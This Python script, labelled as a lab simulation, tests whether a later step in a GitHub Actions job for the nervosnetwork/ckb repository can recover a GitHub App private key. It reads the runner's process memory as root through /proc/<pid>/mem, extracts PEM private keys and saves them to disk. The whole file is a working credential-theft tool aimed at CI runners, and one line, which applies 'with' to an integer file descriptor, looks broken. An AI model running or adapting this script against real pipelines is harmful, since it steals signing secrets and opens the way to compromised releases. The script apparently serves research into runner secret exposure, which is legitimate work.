#!/usr/bin/env python3
# SIMULATION / LAB ONLY — repojack 2026-11-20, bead ...-6bg
#
# Tests the draft's untested inference for nervosnetwork/ckb
# scheduled_audit.yaml: a later step in the same job may recover the
# RELEASE_PLZ_APP_PRIVATE_KEY that an earlier step (actions/create-github-app-token)
# consumed from the runner's secret store.
#
# Method: the Actions Runner (Runner.Worker, a .NET process) holds the job's
# secret variables in its heap for the whole job; a later step on the same
# GitHub-hosted VM runs as the same user with passwordless sudo, i.e. root,
# and root can read /proc/<pid>/mem. Scan rw-p regions for PEM markers in
# both ASCII and UTF-16LE (.NET strings).
#
# Output: candidate PEMs written under ./sim-recovered/ in the workspace,
# plus scan.json meta. NEVER prints secret material to stdout (markers/hashes only).
import glob
import hashlib
import json
import os
import re

PEM_RE = re.compile(
    rb'-----BEGIN (?:[A-Z0-9 ]+)-----\r?\n(?:[A-Za-z0-9+/=]{1,76}\r?\n)+-----END (?:[A-Z0-9 ]+)-----')

def comm(pid):
    try:
        with open(f"/proc/{pid}/comm") as f:
            return f.read().strip()
    except OSError:
        return "?"

def regions(pid):
    out = []
    try:
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (r)([w-])([p-]) .*?(\S*)$', line.strip())
                if not m or m.group(4) != 'w':
                    continue  # secrets live in rw regions; read-only mapped files are noise
                path = m.group(6)
                if path.startswith("/") or path == "[vvar]":
                    continue
                out.append((int(m.group(1), 16), int(m.group(2), 16), path or "anon"))
    except OSError:
        pass
    return out

def scan_region(fd, start, end):
    """Return set of (enc, pem_bytes) found in this region."""
    found = set()
    try:
        buf = os.pread(fd, min(end - start, 64 << 20), start)
    except OSError:
        return found
    for m in PEM_RE.finditer(buf):
        found.add(("ascii", m.group(0)))
    try:
        text = buf.decode("utf-16-le", "ignore")
        for m in PEM_RE.finditer(text.encode("latin1", "ignore")):
            found.add(("utf16", m.group(0)))
    except Exception:
        pass
    return found

def main():
    print("== SIM: runner-memory credential scan ==")
    pids = sorted(int(os.path.basename(p)) for p in glob.glob("/proc/[0-9]*"))
    targets = [p for p in pids if comm(p).startswith("Runner.")]
    others = [p for p in pids if p not in targets]

    os.makedirs("sim-recovered", exist_ok=True)
    seen = {}
    regions_scanned = 0
    meta = []
    for pid in targets + others:
        c = comm(pid)
        try:
            fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
        except OSError as e:
            print(f"  /proc/{pid}/mem ({c}): open failed: {e}")
            continue
        with fd:
            for start, end, label in regions(pid):
                regions_scanned += 1
                for enc, data in scan_region(fd, start, end):
                    sha = hashlib.sha256(data).hexdigest()
                    if sha in seen:
                        continue
                    seen[sha] = True
                    name = f"sim-recovered/cand-{pid}-{enc}-{sha[:12]}.pem"
                    with open(name, "wb") as f:
                        f.write(data)
                    meta.append({
                        "file": name, "pid": pid, "comm": c, "enc": enc,
                        "sha256": sha, "bytes": len(data),
                        "head": data[:30].decode("latin1").strip(),
                        "tail": data[-16:].decode("latin1").strip(),
                    })
                    print(f"  candidate: pid={pid}({c}) enc={enc} bytes={len(data)} sha256={sha[:16]}…")
    with open("sim-recovered/scan.json", "w") as f:
        json.dump({"regions_scanned": regions_scanned, "n_unique": len(meta), "candidates": meta}, f, indent=2)
    print(f"== SIM: scan done: {regions_scanned} rw regions scanned, {len(meta)} unique PEM candidates in ./sim-recovered ==")

if __name__ == "__main__":
    main()